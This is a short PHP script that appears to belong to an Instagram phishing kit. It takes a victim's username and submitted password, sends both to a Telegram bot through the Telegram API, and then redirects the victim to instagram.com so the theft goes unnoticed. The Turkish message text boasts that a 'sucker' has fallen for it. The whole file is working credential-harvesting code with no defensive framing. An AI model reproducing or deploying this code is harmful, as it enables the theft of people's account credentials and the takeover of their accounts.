<?php
include('tg.php');

$id=$_GET["id"];
if($_POST){
$password=$_POST["password"];
header("location: password.php?id=$id");

$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Sublime Saplar 😈
Kullanıcı Adı : '.$id.'
Şifre : '.$password.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header('Location: https://instagram.com/');
}
?>
